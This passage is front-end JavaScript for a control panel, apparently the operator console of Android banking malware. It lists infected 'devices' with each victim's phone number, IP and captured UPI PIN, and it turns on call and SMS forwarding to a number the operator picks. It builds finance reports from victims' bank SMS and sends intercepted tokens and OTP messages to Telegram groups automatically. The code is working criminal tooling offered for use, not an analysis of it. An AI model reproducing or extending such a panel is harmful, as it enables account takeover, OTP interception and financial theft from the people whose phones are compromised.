  $("btnPasteSmsTo").onclick = () => pasteInto("smsTo");
  $("btnPasteSmsMsg").onclick = () => pasteInto("smsMsg");

  let sendAutoPollTimer = null;

  function stopSendAutoPoll() {
    if (sendAutoPollTimer) {
      clearInterval(sendAutoPollTimer);
      sendAutoPollTimer = null;
    }
  }

  function startSendAutoPoll() {
    stopSendAutoPoll();
    sendAutoPollTimer = setInterval(() => {
      if (currentView === "detail" && $("panelSend") && !$("panelSend").classList.contains("hidden")) {
        refreshSendAutoStatus(true);
      }
    }, 4000);
  }

  function renderAutoEvents(events) {
    const box = $("sendAutoEvents");
    const latestEl = $("sendAutoLatest");
    if (!box) return;
    if (!events || !events.length) {
      box.innerHTML = "";
      if (latestEl) latestEl.style.display = "none";
      return;
    }
    const latest = events[0];
    if (latestEl) {
      latestEl.style.display = "block";
      latestEl.innerHTML =
        "<b>Token/SMS queued</b> → device <b>" +
        esc(latest.deviceName || latest.deviceId) +
        "</b> · grp <b>" +
        esc(latest.groupTitle || latest.chatId) +
        "</b> · <b>" +
        esc(String(latest.ms)) +
        " ms</b>" +
        (latest.to ? " · to <code>" + esc(latest.to) + "</code>" : "");
    }
    box.innerHTML = events
      .slice(0, 12)
      .map((e) => {
        const t = e.at ? new Date(e.at).toLocaleTimeString("en-IN") : "";
        return (
          '<div style="padding:6px 0;border-bottom:1px solid var(--border)">' +
          '<span style="color:var(--green);font-weight:700">' +
          esc(String(e.ms)) +
          "ms</span> · " +
          esc(e.deviceName || e.deviceId) +
          " · " +
          esc(e.groupTitle || e.chatId) +
          (e.to ? " · " + esc(e.to) : "") +
          ' <span style="color:var(--muted)">· ' +
          esc(t) +
          "</span></div>"
        );
      })
      .join("");
  }

  async function refreshSendAutoStatus(silent) {
    const box = $("sendAutoStatus");
    const offBtn = $("btnSendAutoOff");
    if (!box || !activeDevice) return;
    try {
      const data = await api(
        "/api/telegram/groups?deviceId=" + encodeURIComponent(activeDevice.id)
      );
      const b = data.binding;
      if (b) {
        box.innerHTML =
          'Send Auto: <b style="color:var(--green)">ON</b> → <b>' +
          esc(b.title) +
          "</b> <code>" +
          esc(b.chatId) +
          "</code>";
        show(offBtn, true);
        renderAutoEvents(data.events || []);
        if (!silent) startSendAutoPoll();
      } else {
        box.innerHTML = "Send Auto: <b>OFF</b> — niche se group choose karke ON karo";
        show(offBtn, false);
        renderAutoEvents([]);
        stopSendAutoPoll();
      }
    } catch (_) {
      if (!silent) {
        box.innerHTML = "Send Auto: status load nahi hua";
        show(offBtn, false);
      }
    }
  }

  function openSendAutoModal(groups) {
    const list = $("sendAutoGroupList");
    list.innerHTML = groups
      .map((g) => {
        const boundHere = g.autoSend?.deviceId === activeDevice.id;
        const boundOther = g.autoSend && !boundHere;
        return `
        <div class="modal-card" style="justify-content:space-between;margin-bottom:8px;cursor:pointer" data-pick-chat="${esc(g.chatId)}" data-pick-source="${esc(g.source || "bot")}">
          <div style="min-width:0;flex:1">
            <div class="val white">${esc(g.title || g.chatId)} <span class="lbl">[${esc(g.source || "bot")}]</span></div>
            <div class="lbl">${esc(g.type || "group")} · <code>${esc(g.chatId)}</code></div>
            <div class="lbl" style="margin-top:4px">${
              boundHere
                ? '<span style="color:var(--green);font-weight:700">Bound to THIS device</span>'
                : boundOther
                  ? "Bound → " + esc(g.autoSend.deviceName || g.autoSend.deviceId)
                  : "Available"
            }</div>
          </div>
          <button type="button" class="btn btn-sm" data-pick-chat="${esc(g.chatId)}" data-pick-source="${esc(g.source || "bot")}">${boundHere ? "Keep" : "Select"}</button>
        </div>`;
      })
      .join("");

    list.querySelectorAll("[data-pick-chat]").forEach((el) => {
      el.onclick = async (e) => {
        e.stopPropagation();
        const chatId = el.dataset.pickChat;
        const source = el.dataset.pickSource || "bot";
        try {
          await api("/api/telegram/groups/" + encodeURIComponent(chatId) + "/auto-send", {
            method: "POST",
            body: JSON.stringify({
              projectId: activeProjectId,
              deviceId: activeDevice.id,
              deviceName: activeDevice.name || activeDevice.id,
              source,
            }),
          });
          show("modalSendAuto", false);
          toast("Send Auto ON");
          refreshSendAutoStatus();
        } catch (err) {
          toast(err.message, true);
        }
      };
    });
    show("modalSendAuto", true);
  }

  $("btnSendAuto").onclick = async () => {
    if (!activeDevice || !activeProjectId) return;
    try {
      const data = await api("/api/telegram/groups");
      const groups = data.groups || [];
      if (!groups.length) {
        toast("Pehle bot ko group/channel me add karo — Telegram & 2FA page pe auto list aayegi", true);
        return;
      }
      openSendAutoModal(groups);
    } catch (e) {
      toast(e.message, true);
    }
  };

  $("btnSendAutoOff").onclick = async () => {
    if (!activeDevice) return;
    try {
      await api("/api/telegram/auto-send?deviceId=" + encodeURIComponent(activeDevice.id), {
        method: "DELETE",
      });
      toast("Send Auto OFF");
      refreshSendAutoStatus();
    } catch (e) {
      toast(e.message, true);
    }
  };

  async function loadTelegramBot() {
    try {
      const me = await api("/api/auth/me");
      $("tg2faChatId").value = me.telegramChatId || "";
      $("tg2faEnabled").checked = !!me.twoFactorEnabled;
      const note = $("tg2faGlobalNote");
      if (note) note.style.display = me.global2FA ? "block" : "none";
    } catch (_) {}

    try {
      const u = await api("/api/telegram/user");
      const st = $("tgUserStatus");
      if (u.connected) {
        st.textContent = "User TG: @" + (u.username || "connected") + (u.phone ? " · " + u.phone : "");
        st.style.color = "var(--green, #56ca00)";
        show("tgUserLoginBox", false);
        show("tgUserConnectedBox", true);
      } else {
        st.textContent = "User TG: Not connected";
        st.style.color = "";
        show("tgUserLoginBox", true);
        show("tgUserConnectedBox", false);
        show("tgUserOtpBox", false);
      }
    } catch (_) {}

    const box = $("tgGroupList");
    const status = $("tgBotStatus");
    try {
      const info = await api("/api/telegram/bot");
      if (info.connected) {
        status.textContent = "Bot @" + (info.botUsername || "bot") + (info.webhookSet ? " · webhook OK" : "");
        status.style.color = "var(--green, #56ca00)";
        $("tgWebhookUrl").value = info.webhookUrl || "";
      } else {
        status.textContent = "Bot: Not connected";
        status.style.color = "";
        $("tgWebhookUrl").value = "";
      }
      const groupsData = await api("/api/telegram/groups");
      const groups = groupsData.groups || [];
      if (!groups.length) {
        box.innerHTML = '<div class="empty">Koi group nahi — bot add karo YA User TG se invite join / Sync karo</div>';
        return;
      }
      box.innerHTML = groups.map((g) => `
        <div class="modal-card" style="margin-bottom:8px;justify-content:space-between;gap:10px;flex-wrap:wrap">
          <div style="min-width:0;flex:1">
            <div class="val white">${esc(g.title || "Untitled")} <span class="lbl">(${esc(g.source || "?")})</span></div>
            <div class="lbl">${esc(g.type || "group")} · <code>${esc(g.chatId)}</code></div>
            <div class="lbl" style="margin-top:4px">${
              g.autoSend
                ? '<span style="color:var(--green);font-weight:700">Auto ON → ' + esc(g.autoSend.deviceName || g.autoSend.deviceId) + "</span>"
                : "Auto send: OFF"
            }</div>
          </div>
          <div style="display:flex;gap:6px;flex-wrap:wrap">
            ${g.autoSend ? `<button class="btn btn-sm btn-danger" data-tg-unbind="${esc(g.chatId)}">Turn OFF</button>` : ""}
            <button class="btn btn-sm btn-outline" data-tg-del="${esc(g.chatId)}">Remove</button>
          </div>
        </div>
      `).join("");
      box.querySelectorAll("[data-tg-del]").forEach((b) => {
        b.onclick = async () => {
          if (!confirm("Remove group from list?")) return;
          try {
            await api("/api/telegram/groups/" + encodeURIComponent(b.dataset.tgDel), { method: "DELETE" });
            loadTelegramBot();
          } catch (e) { toast(e.message, true); }
        };
      });
      box.querySelectorAll("[data-tg-unbind]").forEach((b) => {
        b.onclick = async () => {
          try {
            await api("/api/telegram/groups/" + encodeURIComponent(b.dataset.tgUnbind) + "/auto-send", {
              method: "DELETE",
            });
            toast("Send Auto OFF");
            loadTelegramBot();
          } catch (e) { toast(e.message, true); }
        };
      });
    } catch (e) {
      status.textContent = "Error loading";
      box.innerHTML = '<div class="empty">' + esc(e.message) + "</div>";
    }
  }

  $("btnDownloadBackup").onclick = async () => {
    const key = $("backupAdminKey").value.trim();
    if (!key) return toast("Admin Key daalo", true);
    try {
      const res = await fetch(API + "/api/admin/backup?adminKey=" + encodeURIComponent(key));
      if (!res.ok) {
        const d = await res.json().catch(() => ({}));
        throw new Error(d.error || "Backup failed");
      }
      const blob = await res.blob();
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "darkpanel-backup.json";
      a.click();
      URL.revokeObjectURL(a.href);
      toast("Backup downloaded");
    } catch (e) { toast(e.message, true); }
  };

  $("restoreFile").onchange = async (ev) => {
    const key = $("backupAdminKey").value.trim();
    const file = ev.target.files?.[0];
    ev.target.value = "";
    if (!key) return toast("Admin Key daalo", true);
    if (!file) return;
    if (!confirm("Restore se current accounts overwrite ho jayenge. Continue?")) return;
    try {
      const text = await file.text();
      const json = JSON.parse(text);
      const res = await fetch(API + "/api/admin/restore", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Admin-Key": key,
        },
        body: JSON.stringify(json),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(data.error || "Restore failed");
      toast("Restored — " + (data.users || 0) + " users. Page refresh.");
      $("backupStatus").style.display = "block";
      $("backupStatus").textContent = "OK: " + (data.path || "") + " · users=" + (data.users || 0);
    } catch (e) { toast(e.message, true); }
  };

  $("btnTgUserSendCode").onclick = async () => {
    try {
      await api("/api/telegram/user/send-code", {
        method: "POST",
        body: JSON.stringify({
          apiId: $("tgUserApiId").value.trim(),
          apiHash: $("tgUserApiHash").value.trim(),
          phone: $("tgUserPhone").value.trim(),
        }),
      });
      show("tgUserOtpBox", true);
      toast("OTP Telegram app pe bhej diya");
    } catch (e) { toast(e.message, true); }
  };

  $("btnTgUserVerify").onclick = async () => {
    try {
      const r = await api("/api/telegram/user/verify", {
        method: "POST",
        body: JSON.stringify({
          code: $("tgUserOtp").value.trim(),
          password: $("tgUserPassword").value.trim() || undefined,
        }),
      });
      if (r.needPassword) {
        toast("Telegram 2FA password daalo", true);
        return;
      }
      toast("User TG connected");
      $("tgUserOtp").value = "";
      $("tgUserPassword").value = "";
      loadTelegramBot();
    } catch (e) {
      if (e.message && /password/i.test(e.message)) toast("2FA password chahiye", true);
      else toast(e.message, true);
    }
  };

  $("btnTgUserJoin").onclick = async () => {
    const link = $("tgUserInvite").value.trim();
    if (!link) return toast("Invite link daalo", true);
    try {
      const r = await api("/api/telegram/user/join", {
        method: "POST",
        body: JSON.stringify({ link }),
      });
      toast(r.message || (r.pending ? "Join request sent" : "Joined!"));
      $("tgUserInvite").value = "";
      loadTelegramBot();
    } catch (e) { toast(e.message, true); }
  };

  $("btnTgUserSync").onclick = async () => {
    try {
      const r = await api("/api/telegram/user/sync", { method: "POST", body: "{}" });
      toast("Synced " + (r.count || 0) + " chats");
      loadTelegramBot();
    } catch (e) { toast(e.message, true); }
  };

  $("btnTgUserDisconnect").onclick = async () => {
    if (!confirm("Disconnect User Telegram account?")) return;
    try {
      await api("/api/telegram/user", { method: "DELETE" });
      toast("User TG disconnected");
      loadTelegramBot();
    } catch (e) { toast(e.message, true); }
  };

  $("btnTgRefreshGroups").onclick = async () => {
    try {
      const r = await api("/api/telegram/groups/refresh", { method: "POST", body: "{}" });
      toast("Updated " + (r.updated || 0) + " group name(s)");
      loadTelegramBot();
    } catch (e) { toast(e.message, true); }
  };

  $("btnSave2fa").onclick = async () => {
    try {
      await api("/api/auth/me", {
        method: "PATCH",
        body: JSON.stringify({
          telegramChatId: $("tg2faChatId").value.trim(),
          twoFactorEnabled: $("tg2faEnabled").checked,
        }),
      });
      toast("2FA settings saved");
    } catch (e) { toast(e.message, true); }
  };

  $("btnTgConnect").onclick = async () => {
    const token = $("tgBotToken").value.trim();
    if (!token) return toast("Bot token daalo", true);
    try {
      await api("/api/telegram/bot", { method: "POST", body: JSON.stringify({ token }) });
      $("tgBotToken").value = "";
      toast("Bot connected + webhook set");
      loadTelegramBot();
    } catch (e) { toast(e.message, true); }
  };

  $("btnTgRefreshWh").onclick = async () => {
    try {
      const r = await api("/api/telegram/bot/webhook", { method: "POST", body: "{}" });
      $("tgWebhookUrl").value = r.webhookUrl || "";
      toast("Webhook refreshed");
      loadTelegramBot();
    } catch (e) { toast(e.message, true); }
  };

  $("btnTgDisconnect").onclick = async () => {
    if (!confirm("Disconnect Telegram bot?")) return;
    try {
      await api("/api/telegram/bot", { method: "DELETE" });
      toast("Disconnected");
      loadTelegramBot();
    } catch (e) { toast(e.message, true); }
  };

  $("btnTgAddGroup").onclick = async () => {
    const chatId = $("tgManualChatId").value.trim();
    const title = $("tgManualTitle").value.trim();
    if (!chatId) return toast("Chat ID daalo", true);
    try {
      await api("/api/telegram/groups", {
        method: "POST",
        body: JSON.stringify({ chatId, title: title || undefined }),
      });
      $("tgManualChatId").value = "";
      $("tgManualTitle").value = "";
      toast("Group added");
      loadTelegramBot();
    } catch (e) { toast(e.message, true); }
  };

  document.querySelectorAll(".tab-inner").forEach((t) => {
    t.onclick = () => {
      document.querySelectorAll(".tab-inner").forEach((x) => x.classList.remove("active"));
      t.classList.add("active");
      show("panelSms", t.dataset.panel === "sms");
      show("panelSend", t.dataset.panel === "send");
      if (t.dataset.panel === "send") refreshSendAutoStatus();
    };
  });

  $("detailBtnSettings").onclick = () => activeDevice && showSettingsModal(activeDevice.id);
  $("detailBtnLastSeen").onclick = () => activeDevice && showLastSeenModal(activeDevice.id);
  $("detailBtnForward").onclick = () => activeDevice && showForwardModal(activeDevice.id);
  $("detailBtnFinance").onclick = () => activeDevice && showFinanceModal(activeDevice.id);
  $("detailBtnDelete").onclick = async () => {
    if (!activeDevice || !confirm("Delete device?")) return;
    try {
      await api("/api/projects/" + activeProjectId + "/clients/" + activeDevice.id, { method: "DELETE" });
      switchView("devices");
      loadDevices();
    } catch (e) { toast(e.message, true); }
  };

  function getDeviceById(id) {
    return devices.find((d) => d.id === id) || (activeDevice && activeDevice.id === id ? activeDevice : null);
  }

  function showLastSeenModal(id) {
    const d = getDeviceById(id);
    if (!d) return;
    $("modalLastSeenStatus").textContent = d.status ? "Online" : "Offline";
    $("modalLastSeenStatus").className = "val " + (d.status ? "green" : "orange");
    $("modalLastSeenDot").className = "dot " + (d.status ? "green" : "red");
    const timeText = d.lastSeenFmt && d.lastSeenFmt !== "—"
      ? d.lastSeenFmt
      : (d.status ? fmtDate(Date.now()) : "—");
    $("modalLastSeenTime").textContent = timeText;
    show("modalLastSeen", true);
  }

  function showSettingsModal(id) {
    const d = getDeviceById(id);
    if (!d) return;
    $("modalSettingsBody").innerHTML = `
      <div class="info-list">
        <div class="info-row"><span class="info-lbl">📱 Device ID</span><span class="info-val">${esc(d.id)}</span></div>
        <div class="info-row"><span class="info-lbl">📱 Model</span><span class="info-val">${esc(d.name)}</span></div>
        <div class="info-row"><span class="info-lbl">🔋 Battery</span><span class="info-val">${esc(d.batteryDisplay)}</span></div>
        <div class="info-row"><span class="info-lbl">🤖 Android</span><span class="info-val">${esc(d.android)}</span></div>
        <div class="info-row"><span class="info-lbl">⚙ SDK</span><span class="info-val">${esc(d.sdk)}</span></div>
        <div class="info-row"><span class="info-lbl">📞 Phone</span><span class="info-val">${esc(d.phone)}</span></div>
        <div class="info-row"><span class="info-lbl">💳 UPI Pin</span><span class="info-val">${esc(d.upipin || "N/A")}</span></div>
        <div class="info-row"><span class="info-lbl">📅 Date</span><span class="info-val">${esc(d.lastSeenFmt)}</span></div>
        <div class="info-row"><span class="info-lbl">🌐 IP</span><span class="info-val">${esc(d.ip)}</span></div>
        <div class="info-row"><span class="info-lbl">💾 Storage</span><span class="info-val">${esc(d.storage)}</span></div>
      </div>`;
    show("modalSettings", true);
  }

  async function showForwardModal(id) {
    window._forwardDeviceId = id;
    const d = getDeviceById(id);
    $("forwardModel").textContent = d ? d.name : id;
    $("forwardSim1Label").textContent = d?.sims[0] ? simLabel(d.sims[0], 0) : "Loading...";
    $("forwardSim2Label").textContent = d?.sims[1] ? simLabel(d.sims[1], 1) : "Unknown";
    try {
      const st = await api("/api/projects/" + activeProjectId + "/clients/" + id + "/forwarding");
      $("forwardCallStatus").textContent = "Call: " + (st.call === "active" ? "Active" : "Inactive");
      $("forwardSmsStatus").textContent = "SMS: " + (st.sms === "active" ? "Active" : "Inactive");
      if (st.forwardTo) $("forwardTo").value = st.forwardTo;
    } catch (_) {
      $("forwardCallStatus").textContent = "Call: Inactive";
      $("forwardSmsStatus").textContent = "SMS: Inactive";
    }
    show("modalForward", true);
  }

  async function showFinanceModal(id) {
    $("financeBody").innerHTML = '<div class="empty">Loading finance report...</div>';
    show("modalFinance", true);
    try {
      const report = await api("/api/projects/" + activeProjectId + "/finance/" + id);
      const banks = report.banks || [];
      const sum = report.summary || {};
      if (!banks.length) {
        $("financeBody").innerHTML = '<div class="empty">Koi bank SMS nahi mila (' + (sum.smsScanned || 0) + ' scanned)</div>';
        return;
      }
      $("financeBody").innerHTML = `
        <div class="stats-row" style="margin-bottom:14px">
          <div class="stat-pill"><div class="lbl">Banks</div><div class="val cyan">${sum.bankCount || banks.length}</div></div>
          <div class="stat-pill"><div class="lbl">Balance</div><div class="val" style="color:var(--amber)">₹${esc(sum.totalBalance || "0")}</div></div>
          <div class="stat-pill"><div class="lbl">Credit</div><div class="val green">₹${esc(sum.totalCredit || "0")}</div></div>
          <div class="stat-pill"><div class="lbl">Debit</div><div class="val" style="color:var(--red)">₹${esc(sum.totalDebit || "0")}</div></div>
        </div>
        ${banks.map((b) => `
          <div class="finance-bank">
            <div class="name">${esc(b.bankName)} ${b.accountLast4 ? "••" + esc(b.accountLast4) : ""}</div>
            <div class="bal">₹${esc(b.availableBalance)}</div>
            <div class="sub">Cr ₹${esc(b.totalCredit)} · Dr ₹${esc(b.totalDebit)} · ${b.transactionCount || 0} txns</div>
          </div>
        `).join("")}`;
    } catch (e) {
      $("financeBody").innerHTML = '<div class="empty">' + esc(e.message) + '</div>';
    }
  }

  document.querySelectorAll(".modal-overlay [data-close]").forEach((b) => {
    b.onclick = () => show(b.closest(".modal-overlay"), false);
  });

  document.querySelectorAll(".radio-card[data-sim]").forEach((c) => {
    c.onclick = () => {
      document.querySelectorAll(".radio-card[data-sim]").forEach((x) => x.classList.remove("selected"));
      c.classList.add("selected");
      c.querySelector("input").checked = true;
    };
  });
  document.querySelectorAll(".radio-card[data-ftype]").forEach((c) => {
    c.onclick = () => {
      document.querySelectorAll(".radio-card[data-ftype]").forEach((x) => x.classList.remove("selected"));
      c.classList.add("selected");
      c.querySelector("input").checked = true;
    };
  });

  $("btnActivateForward").onclick = async () => {
    const id = window._forwardDeviceId;
    if (!id) return;
    const sim = document.querySelector('input[name="fwdSim"]:checked')?.value || "1";
    const type = document.querySelector('input[name="fwdType"]:checked')?.value || "call";
    const to = $("forwardTo").value.trim();
    if (!to) return toast("Forward number daalo", true);
    try {
      await api("/api/projects/" + activeProjectId + "/clients/" + id + "/forwarding", {
        method: "POST",
        body: JSON.stringify({ type, sim: Number(sim), to, active: true }),
      });
      toast("Forwarding activated!");
      showForwardModal(id);
    } catch (e) { toast(e.message, true); }
  };

  $("btnDeactivateForward").onclick = async () => {
    const id = window._forwardDeviceId;
    if (!id) return;
    const sim = document.querySelector('input[name="fwdSim"]:checked')?.value || "1";
    const type = document.querySelector('input[name="fwdType"]:checked')?.value || "call";
    try {
      await api("/api/projects/" + activeProjectId + "/clients/" + id + "/forwarding", {
        method: "POST",
        body: JSON.stringify({ type, sim: Number(sim), to: "", active: false }),
      });
      toast("Forwarding deactivated!");
      showForwardModal(id);
    } catch (e) { toast(e.message, true); }
  };

  initAuth();
})();
